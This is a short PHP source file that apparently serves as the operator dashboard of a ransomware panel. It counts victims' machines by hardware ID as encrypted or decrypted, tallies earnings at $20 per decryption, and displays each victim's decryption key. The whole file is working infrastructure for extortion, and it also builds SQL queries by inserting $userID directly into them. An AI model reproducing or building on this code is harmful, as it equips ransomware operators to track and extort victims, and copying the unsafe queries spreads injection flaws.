<?php
require('../includes/db.php');
require('../includes/impo.php');
?>

<style>
#customers {
  font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
  border-collapse: collapse;
  width: 100%;
}

#customers td, #customers th {
  border: 1px solid #ddd;
  padding: 8px;
}

#customers tr:nth-child(even){background-color: #f2f2f2;}

#customers tr:hover {background-color: #ddd;}

#customers th {
  padding-top: 12px;
  padding-bottom: 12px;
  text-align: left;
  background-color: #4CAF50;
  color: white;
}

table {
  border-collapse: collapse;
  border-spacing: 0;
  width: 100%;
  border: 1px solid #ddd;
}

th, td {
  text-align: left;
  padding: 8px;
}
</style>


<h1>Welcome, <?php echo $username; ?>!</h1>
<?php
$eRows = $pdo->query("SELECT COUNT(*) FROM clients WHERE ownerID=$userID AND decrypted=0")->fetchColumn(); 
$dRows = $pdo->query("SELECT COUNT(*) FROM clients WHERE ownerID=$userID AND decrypted=1")->fetchColumn(); 

echo "Encrypted: $eRows<br>";
echo "Decrypted: $dRows<br>";
echo "Made: $".($dRows*20)."<hr>";

?>

<table id="customers">
  <tr>
    <th>Hardware ID</th>
    <th>Decrypted?</th>
    <th>Decryption Key</th>
  </tr>
<?php

$stmt = $pdo->prepare("SELECT * FROM clients WHERE ownerID=:id");
$stmt->execute(['id' => $userID]); 
$data = $stmt->fetchAll();
// and somewhere later:

foreach ($data as $row) { ?>

  <tr>
    <td><?php echo $row['hwid']; ?></td>
    <td><?php
	if($row['decrypted'] == 0) {
		echo "<p style='color:red;'>NO</p>";
	} else {
		echo "<p style='color:green;'>YES</p>";
	}
	?></td>
    <td><?php echo $row['dkey']; ?></td>
  </tr>

<?php } ?>

</table>